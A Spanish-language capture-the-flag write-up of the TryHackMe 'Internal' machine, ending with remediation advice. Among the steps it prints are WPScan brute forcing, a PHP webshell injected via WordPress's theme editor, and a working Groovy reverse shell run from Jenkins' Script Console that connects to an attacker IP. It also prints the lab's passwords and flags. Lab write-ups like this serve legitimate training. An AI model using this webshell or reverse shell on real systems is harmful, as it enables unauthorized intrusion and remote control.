---
layout: single
classes: wide
title: "THM Internal - Writeup"
date: 2026-11-03
difficulty: Medio
operating_system: Linux
platform: THM
tags:
  - WordPress
  - WPScan
  - Brute Force
  - Theme Editor RCE
  - Reverse Shell
  - Credential Reuse
  - SSH Tunneling
  - Jenkins
  - Script Console
  - Privilege Escalation
summary: "Cadena de explotación: enumeración de WordPress con WPScan, obtención de credenciales de admin y RCE vía edición de tema, acceso como aubreanna, túnel SSH a Jenkins interno, RCE por Script Console y escalada final a root con credenciales expuestas."
---

## Información general

| Campo | Valor |
|-------|-------|
| Plataforma | TryHackMe |
| Sistema operativo | Linux |
| Dificultad | Medio |
| Tags | `WordPress`, `WPScan`, `Brute Force`, `Theme Editor RCE`, `SSH Tunneling`, `Jenkins`, `Script Console`, `Privilege Escalation` |
{: .info-table}

## Reconocimiento

Escaneo inicial de puertos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn $ip -oG allPorts
```

Puertos abiertos detectados:

| Puerto | Estado | Servicio |
|--------|--------|----------|
| 22/tcp | open | ssh |
| 80/tcp | open | http |

## Enumeración

### Web (puerto 80)

Enumeración de directorios y rutas relevantes (feroxbuster con filtro por código 200 y extensión `.php`):

```bash
feroxbuster -u http://10.130.168.115 -t 50 -s 200 -x php
```

Hallazgos clave:

- **WordPress** en `/wordpress/` y `/blog/` (incluye `/wp-login.php`, `/wp-admin/`, `xmlrpc.php`).
- **phpMyAdmin** en `/phpmyadmin/`.
- Página por defecto de Apache en `/`.

La superficie de ataque principal se centra en WordPress (`/blog/`).

### WordPress (WPScan)

Enumeración de versión, plugins, temas y usuarios:

```bash
wpscan --url http://internal.thm/blog --enumerate u,vp,vt --api-token <API_TOKEN>
```

Resultados relevantes:

- **WordPress 5.4.2** identificado (versión desactualizada con múltiples vulnerabilidades conocidas).
- **Tema activo**: Twenty Seventeen (2.3).
- **Plugin detectado**: Akismet (versión no determinada por la enumeración).
- **Usuario identificado**: `admin` (por patrón de autor).

Fuerza bruta sobre el usuario `admin` con `rockyou.txt`:

```bash
wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt --api-token <API_TOKEN>
```

```text
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```

## Explotación

### RCE vía Theme Editor (WordPress)

Con acceso al panel de administración (`/blog/wp-admin/`), se edita la plantilla `404.php` del tema activo (**Appearance → Theme Editor → 404.php**) para incluir un webshell simple:

```php
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Ejecución de comandos a través del endpoint modificado:

```text
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=id
```

Desde ahí se establece una reverse shell hacia la máquina atacante (método a elección según el entorno).

## Movimiento lateral

Tras obtener acceso como `www-data`, se revisan archivos locales en busca de credenciales:

```bash
cat /opt/wp-save.txt
```

```text
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

Con estas credenciales se accede como `aubreanna`.

## User Flag

```bash
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
```

## Escalada de privilegios

### Enumeración local y pivoting

Se identifican servicios escuchando en loopback:

```bash
ss -alnp | grep "127.0.0.1"
```

```text
tcp  LISTEN  0  128  127.0.0.1:44681  0.0.0.0:*
tcp  LISTEN  0   80  127.0.0.1:3306   0.0.0.0:*
tcp  LISTEN  0  128  127.0.0.1:8080   0.0.0.0:*
```

El puerto `8080` local expone un servicio web interno. Se crea un túnel SSH para acceder desde la máquina atacante:

```bash
ssh -L 8080:localhost:8080 aubreanna@internal.thm
```

Identificación del servicio:

```bash
whatweb http://localhost:8080
```

Se trata de **Jenkins 2.250** (Jetty 9.4.30) con panel de login en `/login`.

### Acceso a Jenkins

Tras realizar fuerza bruta contra el formulario de autenticación, se obtienen credenciales válidas:

```text
admin:spongebob
```

### RCE en Jenkins (Script Console)

Con acceso administrativo, se utiliza **Manage Jenkins → Script Console** para ejecutar código Groovy que establece una reverse shell hacia la máquina atacante:

```groovy
String host="192.168.141.198";
int port=9001;
String cmd="sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

```bash
nc -nlvp 9001
# ...
whoami
jenkins
```

### Escalada final a root

Enumerando el sistema desde el contexto de `jenkins`, se encuentra una nota con credenciales:

```bash
cat /opt/note.txt
```

```text
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

Con las credenciales expuestas se obtiene acceso como root:

```bash
su root
# Password: tr0ub13guM!@#123
```

## Root Flag

```bash
root@internal:/home/aubreanna# cat /root/root.txt
THM{d0ck3r_d3str0y3r}
```

## Flags

| Tipo | Flag |
|------|------|
| user.txt | `THM{int3rna1_fl4g_1}` |
| root.txt | `THM{d0ck3r_d3str0y3r}` |

## Cadena de explotación

```text
WordPress 5.4.2 (/blog)
-> WPScan: usuario admin + brute force
-> Acceso al panel de administración
-> RCE vía Theme Editor (404.php)
-> Shell como www-data
-> Credenciales en /opt/wp-save.txt (aubreanna)
-> SSH como aubreanna
-> Servicio interno Jenkins en 127.0.0.1:8080
-> Túnel SSH + brute force/login Jenkins
-> RCE vía Script Console (Groovy)
-> Credenciales root en /opt/note.txt
-> Root
```

## Lecciones técnicas

- Un WordPress desactualizado con credenciales débiles permite compromiso rápido mediante herramientas como WPScan y edición de temas.
- Los archivos de texto con credenciales (`wp-save.txt`, `note.txt`) en rutas predecibles son un riesgo crítico de movimiento lateral y escalada.
- Servicios internos (Jenkins) expuestos solo en loopback no están protegidos si un atacante ya tiene acceso local/SSH; el pivoting con túneles SSH los vuelve accesibles.
- La Script Console de Jenkins equivale a ejecución de código en el contexto del servicio; debe restringirse fuertemente o deshabilitarse.

## Remediación

1. Actualizar WordPress, temas y plugins; deshabilitar el editor de archivos en `wp-config.php` (`DISALLOW_FILE_EDIT`).
2. Aplicar contraseñas robustas y MFA para cuentas administrativas (WordPress y Jenkins).
3. Eliminar credenciales en texto plano de rutas accesibles y usar un gestor de secretos.
4. Restringir acceso a Jenkins (red, autenticación fuerte, deshabilitar Script Console para usuarios no estrictamente necesarios) y aislar servicios internos.
5. Revisar permisos sudo/locales y aplicar principio de mínimo privilegio.
